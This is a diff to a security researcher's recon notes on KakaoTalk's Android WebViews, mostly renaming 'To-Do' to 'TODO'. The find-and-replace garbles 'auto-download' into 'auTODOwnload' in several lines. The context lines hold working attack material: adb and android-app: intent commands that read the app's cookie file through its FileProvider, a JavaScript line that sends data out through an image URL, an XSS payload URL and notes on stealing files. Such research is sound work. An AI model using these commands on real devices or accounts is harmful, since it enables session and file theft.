@@ -1,7 +1,7 @@
 # WebView Recon
 
 - [Low Severity Findings](#low-severity-findings)
-- [To-Dos / Digging](#to-dos--digging)
+- [TODOs / Digging](#TODOs--digging)
   - [Tokens / Cookies](#tokens--cookies)
   - [JavaScript Interfaces](#javascriptinterface)
   - [Redirect Endpoints](#redirect-endpoints)
@@ -20,7 +20,7 @@
 
 > Disclaimer: Initial recon was performed on an older version of KakaoTalk (`10.1.7`).
 
-> There are a lot of **TO-DO's** in this document where one can try to dig deeper.
+> There are a lot of **TODO's** in this document where one can try to dig deeper.
 
 ## Low Severity Findings
 
@@ -113,14 +113,14 @@ img.src = 'http://10.0.2.2:8888?data=' + encodeURIComponent(data);
   - Reading a cookie: `adb shell content read --uri "content://com.kakao.talk.FileProvider/external_files/emulated/0/Android/data/com.kakao.talk/KakaoTalk/cookie/.57f323da7592b0b5de1360de3da701b0d1aa6627"`
   - Using the `android-app:` scheme: `adb shell am start "android-app://#Intent\;component=com.kakao.talk/.activity.setting.MyProfileSettingsActivity\;S.EXTRA_URL=content://com.kakao.talk.FileProvider/external_files/emulated/0/Android/data/com.kakao.talk/KakaoTalk/cookie/.57f323da7592b0b5de1360de3da701b0d1aa6627\;end"`
 - There are a couple of JavaScript interfaces that access the user's location (see [below](#javascriptinterface))
-- Auto-download to `/sdcard/Download` via Chrome (`app://kakaotalk/openURL?url=`)
+- AuTODOwnload to `/sdcard/Download` via Chrome (`app://kakaotalk/openURL?url=`)
 - I can access other `BROWSABLE` Activities or Apps via the `android-app:` scheme, e.g.:
   - `location.href = "android-app://com.google.android.googlequicksearchbox/https/www.google.com"`
 - `setWebContentsDebuggingEnabled` is enabled for most WebViews
 - XSS in `com.kakao.talk.activity.cscenter.CsCenterActivity` (search field)
     - https://cs.kakao.com/search?query=%3Cscript%3Ealert%281%29%3C%2Fscript%3E (you need to click into the search field to trigger the alert)
 
-## To-Dos / Digging
+## TODOs / Digging
 
 Things to try out / dig deeper.
 
@@ -241,17 +241,17 @@ Maybe someone finds a XSS here:
   - `XMLHttpRequest` still won't work -> because it's not a `file://` URL?
   - Need to be able to create/download files in/to `Download` folder
 - Cannot steal files that cannot be rendered in a Webview (e.g., `LocalUser_DataStore.pref.preferences_pb` in `files` folder). Text files work fine: `content://com.kakao.talk.FileProvider/onepass/PersistedInstallation.W0RFRkFVTFRd+MTo1NTIzNjczMDMxMzc6YW5kcm9pZDpiNjUwZmVmOGI2MDY1MzVm.json`.
-  - `CommerceShopperWebViewActivity` doesn't auto-download but also doesn't render binary files
+  - `CommerceShopperWebViewActivity` doesn't auTODOwnload but also doesn't render binary files
 
 ### DownloadListener.onDownloadStart
 
 - Check `p21.e` / `DownloaderTask` class (`com.kakao.talk.widget.webview.WebViewHelper` -> `processDownload()` -> `C42792b.m9697b()` -> `DownloaderTask.m16277b()`)
-  - **TO-DO**: Try path traversal
+  - **TODO**: Try path traversal
   - Bypass `DownloaderTask` checks
   - Downloads files to `/sdcard/Download/` directory
   - Not able to overwrite files
   - Play with `data:` URIs (`data:[<mediatype>][;base64],<data>`)
-- **TO-DO:** I *might* be able to force WebViews to auto-download files by pointing them to an attacker-controlled website. Required headers:
+- **TODO:** I *might* be able to force WebViews to auTODOwnload files by pointing them to an attacker-controlled website. Required headers:
   - `Content-Type: application/octet-stream`
   - `content-disposition: attachment; filename=foo.html`
 - Investigate `com.kakao.talk.widget.webview.WebViewHelper` class:
